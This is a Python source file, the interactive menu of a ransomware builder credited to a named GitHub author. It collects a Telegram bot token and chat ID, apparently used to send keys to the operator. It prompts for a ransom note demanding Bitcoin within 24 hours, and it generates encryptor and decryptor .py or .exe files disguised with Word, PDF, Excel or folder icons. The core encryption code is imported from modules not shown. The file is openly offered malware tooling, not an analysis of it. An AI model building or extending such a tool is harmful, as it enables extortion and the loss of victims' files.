from colorama import Fore
from banner import banner
from create_py_file import create_encrypt_script_file, create_decrypt_script_file
from create_exe_file import create_encrypt_execution_file, create_decrypt_execution_file
from ransomware import encrypt_files
import sys
from time import sleep


def main_menu():
    while True:
        banner()
        sleep(0.1)
        print()
        print(Fore.LIGHTBLUE_EX + '[♦] 1. START THE PROGRAM.\n')
        sleep(0.13)
        print()
        print(Fore.MAGENTA + '[♦] 2. GENERATE ENCRYPT SCRIPT FILE(.py).\n')
        sleep(0.16)
        print()
        print(Fore.LIGHTGREEN_EX + '[♦] 3. GENERATE ENCRYPT EXECUTION FILE(.exe).\n')
        sleep(0.19)
        print()
        print(Fore.CYAN + '[♦] 4. GENERATE DECRYPT SCRIPT FILE(.py).\n')
        sleep(0.21)
        print()
        print(Fore.YELLOW + '[♦] 5. GENERATE DECRYPT EXECUTION FILE(.exe).\n')
        sleep(0.24)
        print()
        print(Fore.WHITE + '[♦] 6. ABOUT US.\n')
        sleep(0.27)
        print()
        print(Fore.RED + '[♦] 0.  exit.\n')
        sleep(0.29)
        print()
        try:
            choice = int(input(Fore.LIGHTBLACK_EX + '    [♦♦] SELECT YOUR OPTION : '))
        except KeyboardInterrupt:
            print()
            sys.exit(0)

        enter_to_section(choice)


def enter_to_section(selection):
    if selection == 1:
        start_program_menu()
        return

    if selection == 2:
        generate_encrypt_script_menu()
        return

    if selection == 3:
        generate_encrypt_execution_menu()
        return

    if selection == 4:
        generate_decrypt_script_menu()
        return

    if selection == 5:
        generate_decrypt_execution_menu()
        return

    if selection == 6:
        about_me()
        return

    if selection == 0:
        sys.exit(0)
    print()
    print()
    print(Fore.RED + '''    SELECT A NUMBER BETWEEN 0 TO 6.
     
    SELECT A NUMBER ACCORDING TO OPTIONS. ''')

    sleep(5)


def start_program_menu():
    location = 'START THE PROGRAM SECTION'
    bot_token = get_bot_token(location)
    chat_id = get_chat_id(location)
    encrypt_files(bot_token, chat_id)
    back_to_main_menu()
    return


def generate_encrypt_script_menu():
    location = 'GENERATE SCRIPT (.py) SECTION'
    bot_token = get_bot_token(location)
    chat_id = get_chat_id(location)
    message = get_message_for_victim(location)
    file_name = get_file_name(location)
    create_encrypt_script_file(bot_token, chat_id, message, file_name)
    back_to_main_menu()
    return


def generate_encrypt_execution_menu():
    location = 'GENERATE ENCRYPT EXECUTION FILE(.exe) SECTION'
    bot_token = get_bot_token(location)
    chat_id = get_chat_id(location)
    message = get_message_for_victim(location)
    file_name = get_file_name(location)
    icon_name = get_icon_name(location)
    create_encrypt_execution_file(bot_token, chat_id, message, file_name, icon_name)
    back_to_main_menu()
    return


def generate_decrypt_script_menu():
    location = 'GENERATE DECRYPT SCRIPT FILE(.exe) SECTION'
    key = get_key(location)
    file_name = get_file_name(location)
    create_decrypt_script_file(key, file_name)
    back_to_main_menu()
    return


def generate_decrypt_execution_menu():
    location = 'GENERATE DECRYPT EXECUTION FILE(.exe) SECTION'
    key = get_key(location)
    file_name = get_file_name(location)
    icon_name = get_icon_name(location)
    create_decrypt_execution_file(key, file_name, icon_name)
    back_to_main_menu()
    return


def about_me():
    location_status('ABOUT US')
    my_info = f'''
{Fore.LIGHTBLUE_EX}Hello, it\'s just me :)).

{Fore.GREEN}My name is Hamed Alemoni.

{Fore.MAGENTA}I hope this program be useful for you and please support me by giving star in my github also you can see more project there.

{Fore.YELLOW}My github : https://github.com/hamed-alemoni?tab=repositories
    '''
    print(my_info)

    back_to_main_menu()
    return


def get_bot_token(location):
    while True:
        location_status(location)

        try:
            bot_token = input(Fore.LIGHTBLUE_EX + '[♦] ENTER YOUR TELEGRAM BOT TOKEN : ')
            if not is_token_valid(bot_token):
                print('\n\n\n')
                print(Fore.RED + 'PLEASE ENTER CORRECT TELEGRAM BOT TOKEN...')
                sleep(4)
                continue

        except KeyboardInterrupt:
            print()
            sys.exit(0)

        return bot_token


def is_token_valid(token):
    return len(token) == 46


def get_chat_id(location):
    while True:
        location_status(location)

        try:
            chat_id = input(Fore.LIGHTBLUE_EX + '[♦] ENTER YOUR TELEGRAM CHAT ID : ')
            if not is_chat_id_valid(chat_id):
                print('\n\n\n')
                print(Fore.RED + 'PLEASE ENTER CORRECT CHAT ID...')
                sleep(4)
                continue
        except KeyboardInterrupt:
            print()
            sys.exit(0)

        return chat_id


def is_chat_id_valid(chat_id):
    return len(chat_id) == 9 and chat_id.isnumeric()


def get_message_for_victim(location):
    location_status(location)

    try:
        message = input(Fore.LIGHTBLUE_EX + ''' 
        
EXAMPLE :  
Message : Hello, if you want your information back you should send me 1BTC and you got 24 hours otherwise you lose your info good luck.
BTC Wallet Address: None
My Telegram ID : None

[♦] ENTER YOUR MESSAGE FOR VICTIM LIKE EXAMPLE : ''')
    except KeyboardInterrupt:
        print()
        sys.exit(0)

    return message


def get_file_name(location):
    while True:
        location_status(location)

        try:
            file_name = input(Fore.LIGHTBLUE_EX + '[♦] ENTER YOUR FILE NAME (WITHOUT ANY EXTENSION) : ')
            if not contain_extension(file_name):
                print()
                print(Fore.CYAN + 'YOU CAN SEE YOUR FILE IN render DIRECTORY')
                return file_name
        except KeyboardInterrupt:
            print()
            sys.exit(0)


def get_key(location):
    location_status(location)

    try:
        key = input(Fore.LIGHTBLUE_EX + '[♦] ENTER YOUR KEY TO DECRYPT : ')
    except KeyboardInterrupt:
        print()
        sys.exit(0)

    return key


def get_icon_name(location):
    location_status(location)

    try:
        print(Fore.YELLOW + '''
        
-> 1. GOOGLE DRIVE
-> 2. ADOBE ILLUSTRATOR
-> 3. EXECL
-> 4. GO
-> 5. KOTLIN
-> 6. PDF
-> 7. PHP
-> 8. POWER POINT
-> 9. PYTHON
-> 10. WORD
-> 11. FOLDER
-> 12. PSD

''')
        icon_name = input(Fore.LIGHTBLUE_EX + '[♦] CHOOSE YOUR ICON : ')
        print()
        print()
    except KeyboardInterrupt:
        print()
        sys.exit(0)

    return icon_name


def contain_extension(name):
    return '.' in name


# show user where section actually hes/she is
def location_status(location):
    banner()
    print()
    print()
    print(Fore.LIGHTGREEN_EX + '/////////////////  ' + location + '  /////////////////')
    print()


def back_to_main_menu():
    try:
        print()
        print()
        input(Fore.RED + 'ENTER TO BACK TO MENU... ')
    except KeyboardInterrupt:
        print()
        sys.exit(0)
